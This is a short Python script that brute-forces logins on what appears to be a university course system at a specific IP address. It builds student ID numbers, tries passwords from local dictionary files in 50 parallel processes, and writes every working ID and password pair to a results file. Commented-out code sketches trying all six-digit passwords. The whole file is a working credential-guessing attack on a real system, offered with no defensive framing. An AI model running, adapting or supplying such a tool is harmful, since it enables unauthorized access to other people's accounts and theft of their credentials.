#!/usr/bin/python
# -*- coding: UTF-8 -*-  
# web - main.py
# 2018/12/26 23:21
# Author:Kencin <myzincx@gmail.com>

import requests
import multiprocessing
import os


def Brute_Force_Web(username):
    print('Run task (%s)...' % (os.getpid()))
    path = "./dict"
    files = os.listdir(path)
    for file in files:
        f = open(path + "/" + file)
        lines = f.readlines()
        for line in lines:
            line = line.strip('\n')
            d = {'stid': username, 'pwd': line}
            res = requests.get('http://202.194.81.17:8081/login/loginproc.jsp', params=d,
                               )
            if res.url == 'http://202.194.81.17:8081/courselist.jsp':
                sureFile = open('result.txt', 'a')
                sureFile.writelines(username + ': ' + line )
                print(username)
                print("password:" + line)
                return


def dic():
    path = "./dict"
    files = os.listdir(path)
    print(files)
    # for file in files:
    #     f = open(path + "\\" + file)
    #     lines = f.readlines()
    #     for line in lines:
    #         print(line)


if __name__ == '__main__':
    # fp = open("password.txt", "r")
    # if fp == 0:
    #     print("open file error!")
    #     return;
    # for i in range(130):
    #     i = "201511101%03d" %i
    #     print(i)
    #     for m in range(999999):
    #         m = "%06d" %m
    #         Brute_Force_Web(i, m)
    #print('Parent process %s.' % os.getpid())
    pool = multiprocessing.Pool(processes=50)
    for i in range(2, 120):
        if i in {4, 15, 16, 32, 35, 37, 38, 45, 50, 51, 55, 59, 63,
                 65, 70, 74, 77, 83, 87, 93, 96, 99, 102, 109, 110, 114}:
            continue
        print(i)
        i = "201511101%03d" % i
        pool.apply_async(Brute_Force_Web, args=(i,))
    # i = "201611101114"
    # pool.apply_async(Brute_Force_Web, args=(i,))
    pool.close()
    pool.join()

    # dic()

